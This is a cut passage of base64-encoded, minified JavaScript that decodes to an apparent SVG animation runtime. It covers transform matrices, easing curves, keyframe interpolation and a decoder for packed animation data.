uZy5jYWxsKHQpLnNsaWNlKDgsLTEpOyJPYmplY3QiPT09ZSYmdC5jb25zdHJ1Y3RvciYmKGU9dC5jb25zdHJ1Y3Rvci5uYW1lKTtpZigiTWFwIj09PWV8fCJTZXQiPT09ZSlyZXR1cm4gQXJyYXkuZnJvbSh0KTtpZigiQXJndW1lbnRzIj09PWV8fC9eKD86VWl8SSludCg/Ojh8MTZ8MzIpKD86Q2xhbXBlZCk/QXJyYXkkLy50ZXN0KGUpKXJldHVybiBkKHQsbil9KHQpfHxmdW5jdGlvbigpe3Rocm93IG5ldyBUeXBlRXJyb3IoIkludmFsaWQgYXR0ZW1wdCB0byBzcHJlYWQgbm9uLWl0ZXJhYmxlIGluc3RhbmNlLlxuSW4gb3JkZXIgdG8gYmUgaXRlcmFibGUsIG5vbi1hcnJheSBvYmplY3RzIG11c3QgaGF2ZSBhIFtTeW1ib2wuaXRlcmF0b3JdKCkgbWV0aG9kLiIpfSgpfWZ1bmN0aW9uIGQodCxuKXsobnVsbD09bnx8bj50Lmxlbmd0aCkmJihuPXQubGVuZ3RoKTtmb3IodmFyIGU9MCxyPW5ldyBBcnJheShuKTtlPG47ZSsrKXJbZV09dFtlXTtyZXR1cm4gcn12YXIgeT1nKE1hdGgucG93KDEwLC02KSk7ZnVuY3Rpb24gZyh0KXt2YXIgbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06NjtpZihOdW1iZXIuaXNJbnRlZ2VyKHQpKXJldHVybiB0O3ZhciBlPU1hdGgucG93KDEwLG4pO3JldHVybiBNYXRoLnJvdW5kKCgrdCtOdW1iZXIuRVBTSUxPTikqZSkvZX1mdW5jdGlvbiBwKHQsbil7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOnk7cmV0dXJuIE1hdGguYWJzKHQtbik8ZX12YXIgbT1NYXRoLlBJLzE4MDtmdW5jdGlvbiBiKHQpe3JldHVybiB0fWZ1bmN0aW9uIHcodCxuLGUpe3ZhciByPTEtZTtyZXR1cm4gMyplKnIqKHQqcituKmUpK2UqZSplfWZ1bmN0aW9uIEEoKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOjEscj1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106MTtyZXR1cm4gdDwwfHx0PjF8fGU8MHx8ZT4xP251bGw6cCh0LG4pJiZwKGUscik/YjpmdW5jdGlvbihpKXtpZihpPD0wKXJldHVybiB0PjA/aSpuL3Q6MD09PW4mJmU+MD9pKnIvZTowO2lmKGk+PTEpcmV0dXJuIGU8MT8xKyhpLTEpKihyLTEpLyhlLTEpOjE9PT1lJiZ0PDE/MSsoaS0xKSoobi0xKS8odC0xKToxO2Zvcih2YXIgdSxvPTAsYT0xO288YTspe3ZhciBsPXcodCxlLHU9KG8rYSkvMik7aWYocChpLGwpKWJyZWFrO2w8aT9vPXU6YT11fXJldHVybiB3KG4scix1KX19ZnVuY3Rpb24geCgpe3JldHVybiAxfWZ1bmN0aW9uIGsodCl7cmV0dXJuIDE9PT10PzE6MH1mdW5jdGlvbiBfKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOjEsbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06MDtpZigxPT09dCl7aWYoMD09PW4pcmV0dXJuIGs7aWYoMT09PW4pcmV0dXJuIHh9dmFyIGU9MS90O3JldHVybiBmdW5jdGlvbih0KXtyZXR1cm4gdD49MT8xOih0Kz1uKmUpLXQlZX19dmFyIFM9TWF0aC5zaW4sTz1NYXRoLmNvcyxNPU1hdGguYWNvcyxFPU1hdGguYXNpbixqPU1hdGgudGFuLFA9TWF0aC5hdGFuMixJPU1hdGguUEkvMTgwLEI9MTgwL01hdGguUEksUj1NYXRoLnNxcnQsVD1mdW5jdGlvbigpe2Z1bmN0aW9uIHQoKXt2YXIgbj1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MSxlPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGk9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOjAsdT1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106MSxvPWFyZ3VtZW50cy5sZW5ndGg+NCYmdm9pZCAwIT09YXJndW1lbnRzWzRdP2FyZ3VtZW50c1s0XTowLGE9YXJndW1lbnRzLmxlbmd0aD41JiZ2b2lkIDAhPT1hcmd1bWVudHNbNV0/YXJndW1lbnRzWzVdOjA7cih0aGlzLHQpLHRoaXMubT1bbixlLGksdSxvLGFdLHRoaXMuaT1udWxsLHRoaXMudz1udWxsLHRoaXMucz1udWxsfXJldHVybiB1KHQsW3trZXk6ImRldGVybWluYW50IixnZXQ6ZnVuY3Rpb24oKXt2YXIgdD10aGlzLm07cmV0dXJuIHRbMF0qdFszXS10WzFdKnRbMl19fSx7a2V5OiJpc0lkZW50aXR5IixnZXQ6ZnVuY3Rpb24oKXtpZihudWxsPT09dGhpcy5pKXt2YXIgdD10aGlzLm07dGhpcy5pPTE9PT10WzBdJiYwPT09dFsxXSYmMD09PXRbMl0mJjE9PT10WzNdJiYwPT09dFs0XSYmMD09PXRbNV19cmV0dXJuIHRoaXMuaX19LHtrZXk6InBvaW50Iix2YWx1ZTpmdW5jdGlvbih0LG4pe3ZhciBlPXRoaXMubTtyZXR1cm57eDplWzBdKnQrZVsyXSpuK2VbNF0seTplWzFdKnQrZVszXSpuK2VbNV19fX0se2tleToidHJhbnNsYXRlU2VsZiIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowO2lmKCF0JiYhbilyZXR1cm4gdGhpczt2YXIgZT10aGlzLm07cmV0dXJuIGVbNF0rPWVbMF0qdCtlWzJdKm4sZVs1XSs9ZVsxXSp0K2VbM10qbix0aGlzLnc9dGhpcy5zPXRoaXMuaT1udWxsLHRoaXN9fSx7a2V5OiJyb3RhdGVTZWxmIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg+MCYmdm9pZCAwIT09YXJndW1lbnRzWzBdP2FyZ3VtZW50c1swXTowO2lmKHQlPTM2MCl7dmFyIG49Uyh0Kj1JKSxlPU8odCkscj10aGlzLm0saT1yWzBdLHU9clsxXTtyWzBdPWkqZStyWzJdKm4sclsxXT11KmUrclszXSpuLHJbMl09clsyXSplLWkqbixyWzNdPXJbM10qZS11Km4sdGhpcy53PXRoaXMucz10aGlzLmk9bnVsbH1yZXR1cm4gdGhpc319LHtrZXk6InNjYWxlU2VsZiIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MSxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXToxO2lmKDEhPT10fHwxIT09bil7dmFyIGU9dGhpcy5tO2VbMF0qPXQsZVsxXSo9dCxlWzJdKj1uLGVbM10qPW4sdGhpcy53PXRoaXMucz10aGlzLmk9bnVsbH1yZXR1cm4gdGhpc319LHtrZXk6InNrZXdTZWxmIix2YWx1ZTpmdW5jdGlvbih0LG4pe2lmKG4lPTM2MCwodCU9MzYwKXx8bil7dmFyIGU9dGhpcy5tLHI9ZVswXSxpPWVbMV0sdT1lWzJdLG89ZVszXTt0JiYodD1qKHQqSSksZVsyXSs9cip0LGVbM10rPWkqdCksbiYmKG49aihuKkkpLGVbMF0rPXUqbixlWzFdKz1vKm4pLHRoaXMudz10aGlzLnM9dGhpcy5pPW51bGx9cmV0dXJuIHRoaXN9fSx7a2V5OiJyZXNldFNlbGYiLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOjEsbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06MCxlPWFyZ3VtZW50cy5sZW5ndGg+MiYmdm9pZCAwIT09YXJndW1lbnRzWzJdP2FyZ3VtZW50c1syXTowLHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10/YXJndW1lbnRzWzNdOjEsaT1hcmd1bWVudHMubGVuZ3RoPjQmJnZvaWQgMCE9PWFyZ3VtZW50c1s0XT9hcmd1bWVudHNbNF06MCx1PWFyZ3VtZW50cy5sZW5ndGg+NSYmdm9pZCAwIT09YXJndW1lbnRzWzVdP2FyZ3VtZW50c1s1XTowLG89dGhpcy5tO3JldHVybiBvWzBdPXQsb1sxXT1uLG9bMl09ZSxvWzNdPXIsb1s0XT1pLG9bNV09dSx0aGlzLnc9dGhpcy5zPXRoaXMuaT1udWxsLHRoaXN9fSx7a2V5OiJyZWNvbXBvc2VTZWxmIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg+MCYmdm9pZCAwIT09YXJndW1lbnRzWzBdP2FyZ3VtZW50c1swXTpudWxsLG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOm51bGwsZT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06bnVsbCxyPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdP2FyZ3VtZW50c1szXTpudWxsLGk9YXJndW1lbnRzLmxlbmd0aD40JiZ2b2lkIDAhPT1hcmd1bWVudHNbNF0/YXJndW1lbnRzWzRdOm51bGw7cmV0dXJuIHRoaXMuaXNJZGVudGl0eXx8dGhpcy5yZXNldFNlbGYoKSx0JiYodC54fHx0LnkpJiZ0aGlzLnRyYW5zbGF0ZVNlbGYodC54LHQueSksbiYmdGhpcy5yb3RhdGVTZWxmKG4pLGUmJihlLngmJnRoaXMuc2tld1NlbGYoZS54LDApLGUueSYmdGhpcy5za2V3U2VsZigwLGUueSkpLCFyfHwxPT09ci54JiYxPT09ci55fHx0aGlzLnNjYWxlU2VsZihyLngsci55KSxpJiYoaS54fHxpLnkpJiZ0aGlzLnRyYW5zbGF0ZVNlbGYoaS54LGkueSksdGhpc319LHtrZXk6ImRlY29tcG9zZSIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGU9dGhpcy5tLHI9ZVswXSplWzBdK2VbMV0qZVsxXSxpPVtbZVswXSxlWzFdXSxbZVsyXSxlWzNdXV0sdT1SKHIpO2lmKDA9PT11KXJldHVybntvcmlnaW46e3g6ZyhlWzRdKSx5OmcoZVs1XSl9LHRyYW5zbGF0ZTp7eDpnKHQpLHk6ZyhuKX0sc2NhbGU6e3g6MCx5OjB9LHNrZXc6e3g6MCx5OjB9LHJvdGF0ZTowfTtpWzBdWzBdLz11LGlbMF1bMV0vPXU7dmFyIG89ZVswXSplWzNdLWVbMV0qZVsyXTwwO28mJih1PS11KTt2YXIgYT1pWzBdWzBdKmlbMV1bMF0raVswXVsxXSppWzFdWzFdO2lbMV1bMF0tPWlbMF1bMF0qYSxpWzFdWzFdLT1pWzBdWzFdKmE7dmFyIGw9UihpWzFdWzBdKmlbMV1bMF0raVsxXVsxXSppWzFdWzFdKTtpZigwPT09bClyZXR1cm57b3JpZ2luOnt4OmcoZVs0XSkseTpnKGVbNV0pfSx0cmFuc2xhdGU6e3g6Zyh0KSx5Omcobil9LHNjYWxlOnt4OmcodSkseTowfSxza2V3Ont4OjAseTowfSxyb3RhdGU6MH07aVsxXVswXS89bCxpWzFdWzFdLz1sLGEvPWw7dmFyIHM9MDtyZXR1cm4gaVsxXVsxXTwwPyhzPU0oaVsxXVsxXSkqQixpWzBdWzFdPDAmJihzPTM2MC1zKSk6cz1FKGlbMF1bMV0pKkIsbyYmKHM9LXMpLGE9UChhLFIoaVswXVswXSppWzBdWzBdK2lbMF1bMV0qaVswXVsxXSkpKkIsbyYmKGE9LWEpLHtvcmlnaW46e3g6ZyhlWzRdKSx5OmcoZVs1XSl9LHRyYW5zbGF0ZTp7eDpnKHQpLHk6ZyhuKX0sc2NhbGU6e3g6Zyh1KSx5OmcobCl9LHNrZXc6e3g6ZyhhKSx5OjB9LHJvdGF0ZTpnKHMpfX19LHtrZXk6ImNsb25lIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMubTtyZXR1cm4gbmV3IHRoaXMuY29uc3RydWN0b3IodFswXSx0WzFdLHRbMl0sdFszXSx0WzRdLHRbNV0pfX0se2tleToidG9TdHJpbmciLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOiIgIjtyZXR1cm4gbnVsbD09PXRoaXMucyYmKHRoaXMucz0ibWF0cml4KCIrdGhpcy5tLm1hcCgoZnVuY3Rpb24odCl7cmV0dXJuIGcodCl9KSkuam9pbih0KSsiKSIpLHRoaXMuc319XSxbe2tleToiY3JlYXRlIix2YWx1ZTpmdW5jdGlvbih0KXtyZXR1cm4gdD9BcnJheS5pc0FycmF5KHQpP2YodGhpcyx2KHQpKTp0IGluc3RhbmNlb2YgdGhpcz90LmNsb25lKCk6KG5ldyB0aGlzKS5yZWNvbXBvc2VTZWxmKHQub3JpZ2luLHQucm90YXRlLHQuc2tldyx0LnNjYWxlLHQudHJhbnNsYXRlKTpuZXcgdGhpc319XSksdH0oKTtmdW5jdGlvbiBOKHQsbixlKXtyZXR1cm4gdD49LjU/ZTpufWZ1bmN0aW9uIEModCxuLGUpe3JldHVybiAwPT09dHx8bj09PWU/bjp0KihlLW4pK259ZnVuY3Rpb24gRih0LG4sZSl7dmFyIHI9Qyh0LG4sZSk7cmV0dXJuIHI8PTA/MDpyfWZ1bmN0aW9uIEwodCxuLGUpe3ZhciByPUModCxuLGUpO3JldHVybiByPD0wPzA6cj49MT8xOnJ9ZnVuY3Rpb24gcSh0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7eDpDKHQsbi54LGUueCkseTpDKHQsbi55LGUueSl9fWZ1bmN0aW9uIFYodCxuLGUpe3JldHVybiAwPT09dD9uOjE9PT10P2U6e3g6Rih0LG4ueCxlLngpLHk6Rih0LG4ueSxlLnkpfX1mdW5jdGlvbiBEKHQsbixlKXt2YXIgcj1mdW5jdGlvbih0LG4sZSl7cmV0dXJuIE1hdGgucm91bmQoQyh0LG4sZSkpfSh0LG4sZSk7cmV0dXJuIHI8PTA/MDpyPj0yNTU/MjU1OnJ9ZnVuY3Rpb24geih0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7cjpEKHQsbi5yLGUuciksZzpEKHQsbi5nLGUuZyksYjpEKHQsbi5iLGUuYiksYTpDKHQsbnVsbD09bi5hPzE6bi5hLG51bGw9PWUuYT8xOmUuYSl9fWZ1bmN0aW9uIFkodCxuLGUpe3ZhciByPW4ubGVuZ3RoO2lmKHIhPT1lLmxlbmd0aClyZXR1cm4gTih0LG4sZSk7Zm9yKHZhciBpPW5ldyBBcnJheShyKSx1PTA7dTxyO3UrKylpW3VdPUModCxuW3VdLGVbdV0pO3JldHVybiBpfWZ1bmN0aW9uIEcodCxuKXtmb3IodmFyIGU9W10scj0wO3I8dDtyKyspZS5wdXNoKG4pO3JldHVybiBlfWZ1bmN0aW9uIFUodCxuKXtpZigtLW48PTApcmV0dXJuIHQ7dmFyIGU9KHQ9T2JqZWN0LmFzc2lnbihbXSx0KSkubGVuZ3RoO2Rve2Zvcih2YXIgcj0wO3I8ZTtyKyspdC5wdXNoKHRbcl0pfXdoaWxlKC0tbj4wKTtyZXR1cm4gdH12YXIgJCxXPWZ1bmN0aW9uKCl7ZnVuY3Rpb24gdChuKXtyKHRoaXMsdCksdGhpcy5saXN0PW4sdGhpcy5sZW5ndGg9bi5sZW5ndGh9cmV0dXJuIHUodCxbe2tleToic2V0QXR0cmlidXRlIix2YWx1ZTpmdW5jdGlvbih0LG4pe2Zvcih2YXIgZT10aGlzLmxpc3Qscj0wO3I8dGhpcy5sZW5ndGg7cisrKWVbcl0uc2V0QXR0cmlidXRlKHQsbil9fSx7a2V5OiJyZW1vdmVBdHRyaWJ1dGUiLHZhbHVlOmZ1bmN0aW9uKHQpe2Zvcih2YXIgbj10aGlzLmxpc3QsZT0wO2U8dGhpcy5sZW5ndGg7ZSsrKW5bZV0ucmVtb3ZlQXR0cmlidXRlKHQpfX0se2tleToic3R5bGUiLHZhbHVlOmZ1bmN0aW9uKHQsbil7Zm9yKHZhciBlPXRoaXMubGlzdCxyPTA7cjx0aGlzLmxlbmd0aDtyKyspZVtyXS5zdHlsZVt0XT1ufX1dKSx0fSgpLEg9Ly0uL2csUT1mdW5jdGlvbih0LG4pe3JldHVybiBuLnRvVXBwZXJDYXNlKCl9O2Z1bmN0aW9uIFgodCl7cmV0dXJuImZ1bmN0aW9uIj09dHlwZW9mIHQ/dDpOfWZ1bmN0aW9uIEoodCl7cmV0dXJuIHQ/ImZ1bmN0aW9uIj09dHlwZW9mIHQ/dDpBcnJheS5pc0FycmF5KHQpP2Z1bmN0aW9uKHQpe3ZhciBuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTpiO2lmKCFBcnJheS5pc0FycmF5KHQpKXJldHVybiBuO3N3aXRjaCh0Lmxlbmd0aCl7Y2FzZSAxOnJldHVybiBfKHRbMF0pfHxuO2Nhc2UgMjpyZXR1cm4gXyh0WzBdLHRbMV0pfHxuO2Nhc2UgNDpyZXR1cm4gQSh0WzBdLHRbMV0sdFsyXSx0WzNdKXx8bn1yZXR1cm4gbn0odCxudWxsKTpmdW5jdGlvbih0LG4pe3ZhciBlPWFyZ3VtZW50cy5sZW5ndGg+MiYmdm9pZCAwIT09YXJndW1lbnRzWzJdP2FyZ3VtZW50c1syXTpiO3N3aXRjaCh0KXtjYXNlImxpbmVhciI6cmV0dXJuIGI7Y2FzZSJzdGVwcyI6cmV0dXJuIF8obi5zdGVwc3x8MSxuLmp1bXB8fDApfHxlO2Nhc2UiYmV6aWVyIjpjYXNlImN1YmljLWJlemllciI6cmV0dXJuIEEobi54MXx8MCxuLnkxfHwwLG4ueDJ8fDAsbi55Mnx8MCl8fGV9cmV0dXJuIGV9KHQudHlwZSx0LnZhbHVlLG51bGwpOm51bGx9ZnVuY3Rpb24gWih0LG4sZSl7dmFyIHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10mJmFyZ3VtZW50c1szXSxpPW4ubGVuZ3RoLTE7aWYodDw9blswXS50KXJldHVybiByP1swLDAsblswXS52XTpuWzBdLnY7aWYodD49bltpXS50KXJldHVybiByP1tpLDEsbltpXS52XTpuW2ldLnY7dmFyIHUsbz1uWzBdLGE9bnVsbDtmb3IodT0xO3U8PWk7dSsrKXtpZighKHQ+blt1XS50KSl7YT1uW3VdO2JyZWFrfW89blt1XX1yZXR1cm4gbnVsbD09YT9yP1tpLDEsbltpXS52XTpuW2ldLnY6by50PT09YS50P3I/W3UsMSxhLnZdOmEudjoodD0odC1vLnQpLyhhLnQtby50KSxvLmUmJih0PW8uZSh0KSkscj9bdSx0LGUodCxvLnYsYS52KV06ZSh0LG8udixhLnYpKX1mdW5jdGlvbiBLKHQsbil7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOm51bGw7cmV0dXJuIHQmJnQubGVuZ3RoPyJmdW5jdGlvbiIhPXR5cGVvZiBuP251bGw6KCJmdW5jdGlvbiIhPXR5cGVvZiBlJiYoZT1udWxsKSxmdW5jdGlvbihyKXt2YXIgaT1aKHIsdCxuKTtyZXR1cm4gbnVsbCE9aSYmZSYmKGk9ZShpKSksaX0pOm51bGx9ZnVuY3Rpb24gdHQodCxuKXtyZXR1cm4gdC50LW4udH1mdW5jdGlvbiBudCh0LG4scixpLHUpe3ZhciBvLGE9IkAiPT09clswXSxsPSIjIj09PXJbMF0scz0kW3JdLGY9Tjtzd2l0Y2goYT8obz1yLnN1YnN0cigxKSxyPW8ucmVwbGFjZShILFEpKTpsJiYocj1yLnN1YnN0cigxKSksZShzKSl7Y2FzZSJmdW5jdGlvbiI6aWYoZj1zKGksdSxaLEoscixhLG4sdCksbClyZXR1cm4gZjticmVhaztjYXNlInN0cmluZyI6Zj1LKGksWChzKSk7YnJlYWs7Y2FzZSJvYmplY3QiOmlmKChmPUsoaSxYKHMuaSkscy5mKSkmJiJmdW5jdGlvbiI9PXR5cGVvZiBzLnUpcmV0dXJuIHMudShuLGYscixhLHQpfXJldHVybiBmP2Z1bmN0aW9uKHQsbixlKXtpZihhcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXSYmYXJndW1lbnRzWzNdKXJldHVybiB0IGluc3RhbmNlb2YgVz9mdW5jdGlvbihyKXtyZXR1cm4gdC5zdHlsZShuLGUocikpfTpmdW5jdGlvbihyKXtyZXR1cm4gdC5zdHlsZVtuXT1lKHIpfTtpZihBcnJheS5pc0FycmF5KG4pKXt2YXIgcj1uLmxlbmd0aDtyZXR1cm4gZnVuY3Rpb24oaSl7dmFyIHU9ZShpKTtpZihudWxsPT11KWZvcih2YXIgbz0wO288cjtvKyspdFtvXS5yZW1vdmVBdHRyaWJ1dGUobik7ZWxzZSBmb3IodmFyIGE9MDthPHI7YSsrKXRbYV0uc2V0QXR0cmlidXRlKG4sdSl9fXJldHVybiBmdW5jdGlvbihyKXt2YXIgaT1lKHIpO251bGw9PWk/dC5yZW1vdmVBdHRyaWJ1dGUobik6dC5zZXRBdHRyaWJ1dGUobixpKX19KG4scixmLGEpOm51bGx9ZnVuY3Rpb24gZXQodCxuLHIsaSl7aWYoIWl8fCJvYmplY3QiIT09ZShpKSlyZXR1cm4gbnVsbDt2YXIgdT1udWxsLG89bnVsbDtyZXR1cm4gQXJyYXkuaXNBcnJheShpKT9vPWZ1bmN0aW9uKHQpe2lmKCF0fHwhdC5sZW5ndGgpcmV0dXJuIG51bGw7Zm9yKHZhciBuPTA7bjx0Lmxlbmd0aDtuKyspdFtuXS5lJiYodFtuXS5lPUoodFtuXS5lKSk7cmV0dXJuIHQuc29ydCh0dCl9KGkpOihvPWkua2V5cyx1PWkuZGF0YXx8bnVsbCksbz9udCh0LG4scixvLHUpOm51bGx9ZnVuY3Rpb24gcnQodCxuLGUpe2lmKCFlKXJldHVybiBudWxsO3ZhciByPVtdO2Zvcih2YXIgaSBpbiBlKWlmKGUuaGFzT3duUHJvcGVydHkoaSkpe3ZhciB1PWV0KHQsbixpLGVbaV0pO3UmJnIucHVzaCh1KX1yZXR1cm4gci5sZW5ndGg/cjpudWxsfWZ1bmN0aW9uIGl0KHQsbil7aWYoIW4uZHVyYXRpb258fG4uZHVyYXRpb248MClyZXR1cm4gbnVsbDt2YXIgZT1mdW5jdGlvbih0LG4pe2lmKCFuKXJldHVybiBudWxsO3ZhciBlPVtdO2lmKEFycmF5LmlzQXJyYXkobikpZm9yKHZhciByPW4ubGVuZ3RoLGk9MDtpPHI7aSsrKXt2YXIgdT1uW2ldO2lmKDI9PT11Lmxlbmd0aCl7dmFyIG89bnVsbDtpZigic3RyaW5nIj09dHlwZW9mIHVbMF0pbz10LmdldEVsZW1lbnRCeUlkKHVbMF0pO2Vsc2UgaWYoQXJyYXkuaXNBcnJheSh1WzBdKSl7bz1bXTtmb3IodmFyIGE9MDthPHVbMF0ubGVuZ3RoO2ErKylpZigic3RyaW5nIj09dHlwZW9mIHVbMF1bYV0pe3ZhciBsPXQuZ2V0RWxlbWVudEJ5SWQodVswXVthXSk7bCYmby5wdXNoKGwpfW89by5sZW5ndGg/MT09PW8ubGVuZ3RoP29bMF06bmV3IFcobyk6bnVsbH1pZihvKXt2YXIgcz1ydCh0LG8sdVsxXSk7cyYmKGU9ZS5jb25jYXQocykpfX19ZWxzZSBmb3IodmFyIGYgaW4gbilpZihuLmhhc093blByb3BlcnR5KGYpKXt2YXIgYz10LmdldEVsZW1lbnRCeUlkKGYpO2lmKGMpe3ZhciBoPXJ0KHQsYyxuW2ZdKTtoJiYoZT1lLmNvbmNhdChoKSl9fXJldHVybiBlLmxlbmd0aD9lOm51bGx9KHQsbi5lbGVtZW50cyk7cmV0dXJuIGU/ZnVuY3Rpb24odCxuKXt2YXIgZT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06MS8wLHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10/YXJndW1lbnRzWzNdOjEsaT1hcmd1bWVudHMubGVuZ3RoPjQmJnZvaWQgMCE9PWFyZ3VtZW50c1s0XSYmYXJndW1lbnRzWzRdLHU9YXJndW1lbnRzLmxlbmd0aD41JiZ2b2lkIDAhPT1hcmd1bWVudHNbNV0/YXJndW1lbnRzWzVdOjEsbz10Lmxlbmd0aCxhPXI+MD9uOjA7aSYmZSUyPT0wJiYoYT1uLWEpO3ZhciBsPW51bGw7cmV0dXJuIGZ1bmN0aW9uKHMsZil7dmFyIGM9cyVuLGg9MSsocy1jKS9uO2YqPXIsaSYmaCUyPT0wJiYoZj0tZik7dmFyIHY9ITE7aWYoaD5lKWM9YSx2PSEwLC0xPT09dSYmKGM9cj4wPzA6bik7ZWxzZSBpZihmPDAmJihjPW4tYyksYz09PWwpcmV0dXJuITE7bD1jO2Zvcih2YXIgZD0wO2Q8bztkKyspdFtkXShjKTtyZXR1cm4gdn19KGUsbi5kdXJhdGlvbixuLml0ZXJhdGlvbnN8fDEvMCxuLmRpcmVjdGlvbnx8MSwhIW4uYWx0ZXJuYXRlLG4uZmlsbHx8MSk6bnVsbH1mdW5jdGlvbiB1dCh0KXtyZXR1cm4rKCIweCIrKHQucmVwbGFjZSgvW14wLTlhLWZBLUZdKy9nLCIiKXx8MjcpKX1mdW5jdGlvbiBvdCh0LG4sZSl7cmV0dXJuIXR8fCFlfHxuPnQubGVuZ3RoP3Q6dC5zdWJzdHJpbmcoMCxuKStvdCh0LnN1YnN0cmluZyhuKzEpLGUsZSl9ZnVuY3Rpb24gYXQodCl7dmFyIG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOjI3O3JldHVybiF0fHx0JW4/dCVuOmF0KHQvbixuKX1mdW5jdGlvbiBsdCh0LG4sZSl7aWYodCYmdC5sZW5ndGgpe3ZhciByPXV0KGUpLGk9dXQobiksdT1hdChyKSs1LG89b3QodCxhdChyLDUpLHUpO3JldHVybiBvPW8ucmVwbGFjZSgvXHg3YyQvZywiPT0iKS5yZXBsYWNlKC9ceDJmJC9nLCI9Iiksbz1mdW5jdGlvbih0LG4sZSl7dmFyIHI9KygiMHgiK3Quc3Vic3RyaW5nKDAsNCkpO3Q9dC5zdWJzdHJpbmcoNCk7Zm9yKHZhciBpPW4lcitlJTI3LHU9W10sbz0wO288dC5sZW5ndGg7bys9MilpZigifCIhPT10W29dKXt2YXIgYT0rKCIweCIrdFtvXSt0W28rMV0pLWk7dS5wdXNoKGEpfWVsc2V7dmFyIGw9KygiMHgiK3Quc3Vic3RyaW5nKG8rMSxvKzErNCkpLWk7bys9Myx1LnB1c2gobCl9cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUuYXBwbHkoU3RyaW5nLHUpfShvPShvPWF0b2IobykpLnJlcGxhY2UoL1tceDQxLVx4NUFdL2csIiIpLGksciksbz1KU09OLnBhcnNlKG8pfX1OdW1iZXIuaXNJbnRlZ2VyfHwoTnVtYmVyLmlzSW50ZWdlcj1mdW5jdGlvbih0KXtyZXR1cm4ibnVtYmVyIj09dHlw